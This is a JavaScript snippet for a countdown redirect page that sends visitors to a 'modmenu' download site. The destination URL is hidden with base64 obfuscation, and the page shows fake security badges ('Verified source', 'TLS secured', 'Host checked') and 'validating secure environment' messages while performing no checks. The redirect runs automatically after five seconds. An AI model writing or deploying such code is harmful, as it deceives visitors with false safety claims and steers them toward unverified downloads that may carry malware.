(function() {
  const _0x3e2a = ["aHR0cHM6Ly9tYWM0aHViLm9yZy9tb2RtZW51Lw==", "Z29vZ2xlLmNvbQ=="];
  const TARGET_URL = (function(s) { return atob(s); })(_0x3e2a[0]);
  
  const loaderEl = document.getElementById('loader');
  const statusEl = document.getElementById('status');
  const countdownEl = document.getElementById('countdownDisplay');
  const fallbackContainer = document.getElementById('fallbackContainer');
  
  let redirectCompleted = false;
  let countdownInterval = null;
  let remainingSeconds = 5;
  
  function setLoaderText(text, showSpinner = false) {
    if (!loaderEl) return;
    if (showSpinner) {
      loaderEl.innerHTML = `${text} <span class="spinner"></span>`;
    } else {
      loaderEl.innerHTML = text;
    }
  }
  
  function showSecurityBadges() {
    if (!statusEl) return;
    const badges = document.createElement('div');
    badges.className = 'status-badge';
    badges.innerHTML = `
      <span class="badge-item">✅ Verified source</span>
      <span class="badge-item">🔒 TLS secured</span>
      <span class="badge-item">🛡️ Host checked</span>
    `;
    statusEl.innerHTML = '';
    statusEl.appendChild(badges);
    statusEl.style.color = "#b9f6ca";
  }
  
  function updateCountdownDisplay() {
    if (countdownEl) {
      countdownEl.textContent = `${remainingSeconds}s`;
    }
  }
  
  function stopCountdown() {
    if (countdownInterval) {
      clearInterval(countdownInterval);
      countdownInterval = null;
    }
  }
  
  function showFallbackLink() {
    if (!fallbackContainer) return;
    fallbackContainer.innerHTML = `
      ⚡ <a href="#" id="manualRedirectLink">Continue to your fast download →</a>
    `;
    const manualLink = document.getElementById('manualRedirectLink');
    if (manualLink) {
      manualLink.addEventListener('click', function(e) {
        e.preventDefault();
        if (!redirectCompleted) {
          redirectCompleted = true;
          stopCountdown();
          setLoaderText("Redirecting to direct installation page", false);
          showSecurityBadges();
          if (countdownEl) countdownEl.style.opacity = '0';
          setTimeout(function() {
            window.location.href = TARGET_URL;
          }, 300);
        }
      });
    }
  }
  
  function finalRedirect() {
    if (redirectCompleted) return;
    redirectCompleted = true;
    stopCountdown();
    setLoaderText("Redirecting to direct installation page", false);
    showSecurityBadges();
    if (countdownEl) countdownEl.style.opacity = '0';
    setTimeout(function() {
      window.location.href = TARGET_URL;
    }, 600);
  }
  
  function startCountdown() {
    updateCountdownDisplay();
    countdownInterval = setInterval(function() {
      if (redirectCompleted) {
        stopCountdown();
        return;
      }
      remainingSeconds--;
      if (remainingSeconds <= 0) {
        stopCountdown();
        finalRedirect();
      } else {
        updateCountdownDisplay();
      }
    }, 1000);
  }
  
  setLoaderText("Validating secure environment...", false);
  showSecurityBadges();
  
  setTimeout(() => {
    if (!redirectCompleted) {
      setLoaderText("Preparing safe download channel", true);
    }
  }, 600);
  
  startCountdown();
  showFallbackLink();
  
  setTimeout(function() {
    if (!redirectCompleted && remainingSeconds > 0) {
      if (fallbackContainer) {
        const currentHtml = fallbackContainer.innerHTML;
        if (!currentHtml.includes('still having trouble')) {
          fallbackContainer.innerHTML = currentHtml + '<br><span style="font-size:0.75rem; display:inline-block; margin-top:6px;">💡 If the redirect doesn\'t start automatically, click the link above.</span>';
        }
      }
    }
  }, 4000);
  
  window.addEventListener('load', function() {
    if (statusEl && statusEl.children.length === 0) {
      showSecurityBadges();
    }
  });
})();